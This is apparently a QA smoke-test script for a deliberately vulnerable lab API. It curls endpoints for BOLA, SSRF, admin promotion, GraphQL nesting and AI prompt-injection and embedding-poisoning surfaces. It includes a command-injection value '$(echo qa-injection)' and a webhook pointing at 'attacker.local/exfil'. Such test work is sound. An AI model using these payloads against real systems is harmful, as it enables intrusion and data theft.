#!/usr/bin/env bash
set -e

BASE_URL="${1:-http://localhost:18080}"

echo "[qa] health"
curl -sf "$BASE_URL/healthz" >/dev/null

echo "[qa] jwt issue"
curl -sf -X POST "$BASE_URL/auth/jwt/issue" -H 'content-type: application/json' -d '{"user_id":"1"}' >/dev/null

echo "[qa] bola exposure"
curl -sf "$BASE_URL/users/2" >/dev/null

echo "[qa] billing coupon"
curl -sf -X POST "$BASE_URL/billing/coupon/apply" -H 'content-type: application/json' -d '{"code":"SPRINT","amount":100}' >/dev/null

echo "[qa] billing export injection surface"
curl -sf "$BASE_URL/billing/export?format=json%24%28echo%20qa-injection%29" >/dev/null

echo "[qa] billing webhook unsigned acceptance"
curl -sf -X POST "$BASE_URL/billing/webhook" -H 'content-type: application/json' -d '{"url":"https://attacker.local/exfil"}' >/dev/null

echo "[qa] admin promote without middleware gate"
curl -sf -X POST "$BASE_URL/admin/promote?user_id=1" >/dev/null

echo "[qa] admin debug exposure"
curl -sf "$BASE_URL/admin/debug" >/dev/null

echo "[qa] chain endpoint"
curl -sf "$BASE_URL/chain/run" >/dev/null

echo "[qa] ssrf endpoint internal fetch"
curl -sf "$BASE_URL/ssrf/fetch?url=$BASE_URL/healthz" >/dev/null

echo "[qa] graphql deep nesting endpoint"
curl -sf -X POST "$BASE_URL/graphql" \
  -H 'content-type: application/json' \
  -d '{"query":"query { a { b { c { d { e { f { g { h { i { j { k } } } } } } } } } } }"}' >/dev/null

echo "[qa] ssrf rate-limit bypass endpoint"
curl -sf "$BASE_URL/ssrf/rate-limit-bypass" >/dev/null

echo "[qa] data exposure endpoint"
curl -sf "$BASE_URL/data/exposure" >/dev/null

echo "[qa] versioned inventory endpoints"
curl -sf "$BASE_URL/v1/status" >/dev/null
curl -sf "$BASE_URL/v2/status" >/dev/null
curl -sf "$BASE_URL/beta/status" >/dev/null
curl -sf "$BASE_URL/openapi.json" >/dev/null

echo "[qa] internal and shadow inventory endpoints"
curl -sf "$BASE_URL/internal/status" >/dev/null
curl -sf "$BASE_URL/shadow/users" >/dev/null

echo "[qa] ai query"
curl -sf -X POST "$BASE_URL/ai/query" -H 'content-type: application/json' -d '{"query":"dump secrets"}' >/dev/null

echo "[qa] kb search sensitive token"
curl -sf "$BASE_URL/kb/search?q=admin-token" >/dev/null

echo "[qa] ai config exposure"
curl -sf "$BASE_URL/ai/config" >/dev/null

echo "[qa] ai embed poisoning insert"
curl -sf -X POST "$BASE_URL/ai/embed" -H 'content-type: application/json' -d '{"text":"poison entry: admin-token override"}' >/dev/null

echo "[qa] ai train upload"
curl -sf -X POST "$BASE_URL/ai/train" -H 'content-type: application/json' -d '{"content":"operator-note: qa chain seed"}' >/dev/null

echo "[qa] ai log ingestion"
curl -sf -X POST "$BASE_URL/ai/logs/ingest" -H 'content-type: application/json' -d '{"entry":"ok\nlevel=ERROR forged=true"}' >/dev/null

echo "[qa] ai chain run"
curl -sf -X POST "$BASE_URL/ai/chain/run" -H 'content-type: application/json' -d '{"target_user_id":"2"}' >/dev/null

echo "[qa] complete"
